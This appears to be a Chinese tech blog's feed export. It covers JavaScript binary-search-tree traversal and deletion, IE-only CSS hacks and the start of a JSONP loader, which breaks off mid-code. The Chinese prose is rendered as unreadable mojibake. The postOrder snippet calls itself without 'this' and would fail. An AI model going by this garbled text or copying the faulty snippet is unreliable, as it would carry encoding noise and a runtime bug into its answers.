title="ååºéå†"></a>ååºéå†</h4><p>è§„åˆ™æ˜¯ä»å·¦èŠ‚ç‚¹å¼€å§‹ï¼Œå†å³èŠ‚ç‚¹ï¼Œæœ€ååˆ°æ ¹èŠ‚ç‚¹ï¼Œå›¾ç¤º(æ¥è‡ª <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="noopener">Wikipedia</a>)ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9d/Sorted_binary_tree_postorder.svg/440px-Sorted_binary_tree_postorder.svg.png?1445511399697" alt="postOrder"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BST.prototype.postOrder = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        postOrder(node.left);</span><br><span class="line">        postOrder(node.right);</span><br><span class="line">        <span class="built_in">console</span>.log(node.getData());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ†å±‚éå†å¹¿åº¦æŸ¥è¯¢-Breadth-First-Search"><a href="#åˆ†å±‚éå†å¹¿åº¦æŸ¥è¯¢-Breadth-First-Search" class="headerlink" title="åˆ†å±‚éå†å¹¿åº¦æŸ¥è¯¢(Breadth First Search)"></a>åˆ†å±‚éå†å¹¿åº¦æŸ¥è¯¢(Breadth First Search)</h4><p>åˆ†å±‚éå†ç›¸å¯¹å¤æ‚ï¼Œå®ƒæ˜¯ä¸€å±‚ä¸€å±‚è¿›è¡Œéå†çš„ï¼Œå›¾ç¤º(æ¥è‡ª <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="noopener">Wikipedia</a>)ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/Sorted_binary_tree_breadth-first_traversal.svg/320px-Sorted_binary_tree_breadth-first_traversal.svg.png" alt="level tranverse"></p><p>å…·ä½“æ€è·¯æ˜¯å…ˆå®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åæŠŠå„å±‚èŠ‚ç‚¹åœ¨æ¯æ¬¡å¾ªç¯å‹å…¥è¿™ä¸ªæ•°ç»„ï¼Œæ¯æ¬¡å¾ªç¯éƒ½å°†è¿™ä¸€å±‚èŠ‚ç‚¹çš„å€¼æ‰“å°å‡ºæ¥ï¼ŒåŒæ—¶è®¾ç½®å¾ªç¯ç»“æŸæ¡ä»¶ä¸ºå½“å‰ç»“ç‚¹ä¸ºæœ€åèŠ‚ç‚¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BST.prototype.levelTraverse = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">let</span> q = [node],</span><br><span class="line">        current = <span class="number">0</span>,</span><br><span class="line">        last = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (current &lt; q.length) &#123;</span><br><span class="line">        last = q.length;</span><br><span class="line">        <span class="keyword">let</span> A = [];</span><br><span class="line">        <span class="keyword">while</span> (current &lt; last) &#123;</span><br><span class="line">            A.push(q[current].getData());</span><br><span class="line">            <span class="keyword">if</span> (q[current].left) &#123;</span><br><span class="line">                q.push(q[current].left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (q[current].right) &#123;</span><br><span class="line">                q.push(q[current].right);</span><br><span class="line">            &#125;</span><br><span class="line">            current++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(A.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h4><p>æŸ¥æ‰¾å…¶å®ç›¸å¯¹ç®€å•ï¼Œæ¯•ç«ŸæŸ¥æ‰¾æ•°å€¼ä¸å½“å‰ç»“ç‚¹ï¼Œå°åˆ™å¾ªç¯åˆ°å·¦èŠ‚ç‚¹ï¼Œå¤§åˆ™å¾ªç¯åˆ°å³èŠ‚ç‚¹ï¼Œç­‰äºåˆ™è¿”å›ï¼ŒæŸ¥æ‰¾ä¸åˆ°è¿”å› nullã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BST.prototype.find = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</span><br><span class="line">    <span class="keyword">while</span> (current) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Object</span>.is(data, current.getData())) &#123;</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &lt; current.getData()) &#123;</span><br><span class="line">            current = current.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            current = current.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h4><p>è¿™é‡Œæœ‰ä¸ªè§†é¢‘è®²è§£éå¸¸è¯¦ç»†ï¼Œä¸è¿‡è¦è‡ªå¤‡æ¢¯å­ï¼š<a href="https://youtu.be/gcULXE7ViZw" target="_blank" rel="noopener">Delete a node from Binary Search Tree</a></p><iframe width="560" height="315" src="https://www.youtube.com/embed/gcULXE7ViZw" frameborder="0" allowfullscreen></iframe><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">BST.prototype.deleteNode = <span class="function"><span class="keyword">function</span>(<span class="params">node, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!node) &#123;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &lt; node.data) &#123;</span><br><span class="line">        node.left = <span class="keyword">this</span>.deleteNode(node.left, data);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &gt; node.data) &#123;</span><br><span class="line">        node.right = <span class="keyword">this</span>.deleteNode(node.right, data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((!node.left) &amp;&amp; (!node.right)) &#123;</span><br><span class="line">            node = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!node.left) &#123;</span><br><span class="line">            node = node.right;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!node.right) &#123;</span><br><span class="line">            node = node.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> temp = node.right.getMin();</span><br><span class="line">            node.data = temp;</span><br><span class="line">            node.right = <span class="keyword">this</span>.deleteNode(node.right, temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BST.prototype.delete = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.root = <span class="keyword">this</span>.deleteNode(<span class="keyword">this</span>.root, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¨éƒ¨ä»£ç åœ¨ <a href="https://github.com/youngdze/js-algorithms/blob/master/lib/dataStructures/binarySearchTree.js" target="_blank" rel="noopener">Github</a>ã€‚</p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul><li><a href="http://blog.csdn.net/luckyxiaoqiang/article/details/7518888" target="_blank" rel="noopener">http://blog.csdn.net/luckyxiaoqiang/article/details/7518888</a></li><li><a href="https://en.wikipedia.org/wiki/Tree_traversal" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Tree_traversal</a></li><li><a href="https://youtu.be/gcULXE7ViZw" target="_blank" rel="noopener">https://youtu.be/gcULXE7ViZw</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;åƒæˆ‘è¿™ç§é‡ç”Ÿç¨‹åºå‘˜è¿å„å¤§å…¬å¸æ ¡æ‹›ç¬”è¯•éƒ½è¿‡ä¸äº†ï¼Œä¸»è¦æ˜¯æ•°æ®ç»“æ„å’Œç®—æ³•è–„å¼±ï¼Œä»Šå¤©å°ç±³å‡ºäº†é“äºŒå‰æ ‘ï¼Œè€ƒäºŒå‰æ ‘çš„åˆ†å±‚éå†ï¼Œæˆ‘å½“ç„¶æ˜¯ä¸ä¼šåšï¼Œç„¶åå°±æ²¡æœ‰ç„¶åäº†ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;èŠ‚ç‚¹å®šä¹‰&quot;&gt;&lt;a href=&quot;#èŠ‚ç‚¹å®šä¹‰&quot; class=&quot;headerlink&quot; title=&quot;èŠ‚ç‚¹å®šä¹‰&quot;&gt;&lt;/a&gt;èŠ‚ç‚¹å®šä¹‰&lt;/h4&gt;&lt;p&gt;äºŒå‰æ ‘èŠ‚ç‚¹å®šä¹‰ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Node&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;data, left, right&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.data = data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.left = left;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.right = right;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Algorithm" scheme="http://youngdze.co/categories/Algorithm/"/>
    
    
      <category term="binary search tree" scheme="http://youngdze.co/tags/binary-search-tree/"/>
    
  </entry>
  
  <entry>
    <title>CSS Hack</title>
    <link href="http://youngdze.co/2015/10/18/css-hack/"/>
    <id>http://youngdze.co/2015/10/18/css-hack/</id>
    <published>2015-10-18T05:21:22.000Z</published>
    <updated>2016-12-05T05:36:07.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬ç¯‡æ–‡ç« å°±æ˜¯ä¸ºäº†æˆ‘å»å‰ç«¯ç¬”è¯•é¢è¯•è€Œå†™çš„ï¼Œå‚è€ƒ <a href="http://www.webdevout.net/css-hacks" target="_blank" rel="noopener">CSS hacks</a> å’Œ <a href="http://browserhacks.com/" target="_blank" rel="noopener">Browserhacks</a>ã€‚</p></blockquote> <a id="more"></a><h4 id="IE-æœ‰æ¡ä»¶æ‰§è¡Œ"><a href="#IE-æœ‰æ¡ä»¶æ‰§è¡Œ" class="headerlink" title="IE æœ‰æ¡ä»¶æ‰§è¡Œ"></a>IE æœ‰æ¡ä»¶æ‰§è¡Œ</h4><p><strong>è¯­æ³•</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if condition]&gt; HTML &lt;![endif]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if !condition]&gt; HTML &lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><p>ç­‰äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if IE8]&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><p>å°äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if lt IE8]&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><p>å°äºæˆ–ç­‰äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if lte IE8]&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><p>å¤§äºæˆ–ç­‰äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if gte IE8]&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><p>å¤§äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if gt IE8]&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸å¤§äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if !gt IE8]&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸æ˜¯</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if !IE]&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="CSS-selectors"><a href="#CSS-selectors" class="headerlink" title="CSS selectors"></a>CSS selectors</h4><h5 id="è¿™äº›å®é™…ä¸Šæ˜¯ç”¨äº†æµè§ˆå™¨çš„-bug-æ¥å®ç°çš„"><a href="#è¿™äº›å®é™…ä¸Šæ˜¯ç”¨äº†æµè§ˆå™¨çš„-bug-æ¥å®ç°çš„" class="headerlink" title="è¿™äº›å®é™…ä¸Šæ˜¯ç”¨äº†æµè§ˆå™¨çš„ bug æ¥å®ç°çš„"></a>è¿™äº›å®é™…ä¸Šæ˜¯ç”¨äº†æµè§ˆå™¨çš„ bug æ¥å®ç°çš„</h5><p>IE6 å’Œä»¥ä¸‹ IE ç‰ˆæœ¬</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* <span class="selector-tag">html</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>IE7 å’Œä»¥ä¸‹ IE ç‰ˆæœ¬ï¼ˆåŒ…æ‹¬ IE6ï¼‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-pseudo">:first-child+html</span> &#123;&#125; * <span class="selector-tag">html</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>IE7 only</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-pseudo">:first-child+html</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>IE7 å’Œç°ä»£æµè§ˆå™¨ only</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span>&gt;<span class="selector-tag">body</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>åªç”¨äºç°ä»£æµè§ˆå™¨(IE8 and above)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span>&gt;<span class="comment">/**/</span><span class="selector-tag">body</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>ç”¨æ³•(ä»¥ IE7 only ä¸ºä¾‹)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-pseudo">:first-child+html</span> <span class="selector-id">#foo</span> <span class="selector-class">.bar</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="important"><a href="#important" class="headerlink" title="!important"></a>!important</h4><p>ç”±äº IE6 åŠä»¥ä¸‹ç‰ˆæœ¬ IE ä¸æ”¯æŒ <code>!important</code>ï¼Œæ‰€ä»¥å¦‚ä»¥ä¸‹ CSS IE6 åŠä»¥ä¸‹ç‰ˆæœ¬ä¼šä½¿ç”¨åé¢çš„æ ·å¼</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: green <span class="meta">!important</span>;   <span class="comment">/* ä¸»æµæµè§ˆå™¨è¯†åˆ«æ ‡è¯†ç¬¦ */</span></span><br><span class="line">    <span class="attribute">background</span>: red;    <span class="comment">/* IE6 å’Œä»¥ä¸‹ç‰ˆæœ¬ IE è¯†åˆ« */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="import"><a href="#import" class="headerlink" title="@import"></a>@import</h4><p>IE7 åŠä»¥ä¸‹ç‰ˆæœ¬ä¸æ”¯æŒ <code>@import</code>ï¼Œ<a href="http://www.webdevout.net/css-hacks" target="_blank" rel="noopener">CSS Hacks</a> çš„è§£å†³åšæ³•æ˜¯ç»™é IE7 åŠä»¥ä¸‹ç‰ˆæœ¬æ·»åŠ ä¸€ä¸ª css <code>@import &quot;non-ie.css&quot; all;</code>ï¼Œæ€ä¹ˆçœ‹éƒ½å¤ªå¥‡è‘©äº†ã€‚</p><h4 id="property-value-å’Œ-property-value"><a href="#property-value-å’Œ-property-value" class="headerlink" title="_property: value å’Œ -property: value"></a>_property: value å’Œ -property: value</h4><p>åªæœ‰ IE6 åŠä»¥ä¸‹ç‰ˆæœ¬ IE æ”¯æŒè¿™ç§ hackï¼Œå¹¶ä¸”è¿™ç§ CSS å†™æ³•æ˜¯éæ³•çš„ï¼Œå½“ç„¶å¦‚æœæƒ³åªç”¨ä¸ IE6 åŠä»¥ä¸‹ç‰ˆæœ¬ IE å°±å¯ä»¥è¿™æ ·å†™ã€‚ å…¶å® IE6 åŠä»¥ä¸‹ç‰ˆæœ¬ IE ä¸ä¼šå¯¹ CSS å±æ€§å‰ç¼€ä¸ºéå­—æ¯çš„å±æ€§æŠ¥é”™æ‰æœ‰è¿™ç§ hackã€‚</p><h4 id="property-value"><a href="#property-value" class="headerlink" title="*property: value"></a>*property: value</h4><p>IE7 ä¿®å¤äº† CSS å±æ€§ä¸º <code>-</code> å’Œ <code>_</code> åŒæ ·è¯†åˆ«çš„é—®é¢˜ï¼Œå½“å…¶ä»–éå­—æ¯å‰ç¼€åº”ç”¨è¿˜æ˜¯å¯ä»¥ï¼Œæ¯”å¦‚ <code>*</code>ï¼Œæ‰€ä»¥è¿™ç§ hack å¯ä»¥ç”¨äº IE7 åŠå…¶ä»¥ä¸‹ç‰ˆæœ¬ã€‚</p><h4 id="gt-body"><a href="#gt-body" class="headerlink" title="&gt;body"></a>&gt;body</h4><p><code>&gt;body</code> æŒ‰æ ‡å‡†æ˜¯é”™è¯¯çš„ CSS å†™æ³•ï¼Œä½† IE7 ä¼šå°†å…¶è§†ä¸ºåˆæ³•é€‰æ‹©å™¨ç­‰åŒäº <code>*&gt;body</code>ï¼ŒåŒæ ·å¯¹äº <code>*+p</code> ä¹‹ç±» IE7 ä¹Ÿä¼šè§†ä¸º <code>*+p</code>ï¼Œä¸è¿‡å…¶ä»–æµè§ˆå™¨åˆ™ä¼šæ— è§†è¿™ä¸ªé”™è¯¯çš„é€‰æ‹©å™¨ï¼Œå› æ­¤è¿™ç§ hack å¯ä»¥ç”¨äº IE7ã€‚</p><h4 id="html"><a href="#html" class="headerlink" title="html*"></a>html*</h4><p><code>html*</code> æŒ‰æ ‡å‡†æ˜¯é”™è¯¯çš„ CSS å†™æ³•ï¼Œä½† IE7 ä¼šå°†å…¶è§†ä¸ºåˆæ³•ç­‰åŒäº <code>html *</code>ï¼Œè€Œ <code>**</code> åˆ™ä¼šè§†ä¸º <code>* *</code>ï¼Œè¿™ç§ hack å¯ä»¥ç”¨äº IE7 åŠä»¥ä¸‹ç‰ˆæœ¬ã€‚</p><h4 id="ie"><a href="#ie" class="headerlink" title="!ie"></a>!ie</h4><p><code>!ie</code> æŒ‰æ ‡å‡†æ˜¯é”™è¯¯çš„ CSS å†™æ³•ï¼Œä½† IE7 ä¼šå°†å…¶è§†ä¸ºåˆæ³•ï¼Œä¸»è¦æ˜¯å®ƒä¿®å¤ <code>!important</code> é—®é¢˜æ—¶åˆå‡ºç°çš„é—®é¢˜ï¼Œç”šè‡³ä½ åœ¨ <code>!</code> åŠ ä»»ä½•å­—æ¯éƒ½æ˜¯åˆæ³•çš„ï¼Œè¿™ç§ hack å¯ä»¥ç”¨äº IE7 åŠä»¥ä¸‹ç‰ˆæœ¬ã€‚</p><h4 id="important-1"><a href="#important-1" class="headerlink" title="!important!"></a>!important!</h4><p>å¥½å§è¿™ä¸ªåœ¨ IE7 ä¹Ÿæ˜¯åˆæ³•çš„ï¼ŒçœŸæ˜¯ä¸ªå·¨å‘ã€‚</p><h4 id="property-value-9"><a href="#property-value-9" class="headerlink" title="property: value\9"></a>property: value\9</h4><p>ä¸€å¼€å§‹çœ‹åˆ°æˆ‘ä¹Ÿæ˜¯æƒ³â€œè¿™ä»€ä¹ˆé¬¼å†™æ³•â€ï¼Œå®ƒç¡®å®æ˜¯åœ¨ IE6~IE8 èµ·ä½œç”¨çš„ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.selector</span> &#123; <span class="attribute">property</span>: value\<span class="number">9</span>; &#125;</span><br><span class="line">.selector &#123; property/*\**/: value\9; &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;æœ¬ç¯‡æ–‡ç« å°±æ˜¯ä¸ºäº†æˆ‘å»å‰ç«¯ç¬”è¯•é¢è¯•è€Œå†™çš„ï¼Œå‚è€ƒ &lt;a href=&quot;http://www.webdevout.net/css-hacks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CSS hacks&lt;/a&gt; å’Œ &lt;a href=&quot;http://browserhacks.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Browserhacks&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="css hacks" scheme="http://youngdze.co/tags/css-hacks/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript è·¨åŸŸè¯·æ±‚</title>
    <link href="http://youngdze.co/2015/10/14/javascript-csrf/"/>
    <id>http://youngdze.co/2015/10/14/javascript-csrf/</id>
    <published>2015-10-14T13:19:07.000Z</published>
    <updated>2016-12-05T05:36:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ª ECMAScript6 ç‰ˆæœ¬çš„ JSONP æ–¹æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> jsonpLoad = <span class="function">(<span class="params">url</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> timeout = <span class="number">5000</span>;</span><br><span class="line"></span><br><span class="line">    Element.prototype.remove = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.parentNode.removeChild(<span class="keyword">this</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> callback = <span class="string">`__callback<span class="subst">$&#123;index++&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">const</span> timeoutID = <span class="built_in">window</span>.setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Request timeout.'</span>));</span><br><span class="line">    &#125;, timeout);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    script.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    script.async = <span class="literal">true</span>;</span><br><span class="line">    script.src = <span class="string">`<span class="subst">$&#123;url&#125;</span><span class="subst">$&#123;!~url.indexOf(<span class="string">'?'</span>)? <span class="string">'?'</span>: <span class="string">'&amp;'</span>&#125;</span>callback=<span class="subst">$&#123;callback&#125;</span>`</span>;</span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">'head'</span>).appendChild(script);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">window</span>[callback] = <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        script.remove();</span><br><span class="line">        <span class="built_in">window</span>.clearTimeout(timeoutID);</span><br><span class="line">        resolve(res);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;);</span><br><span 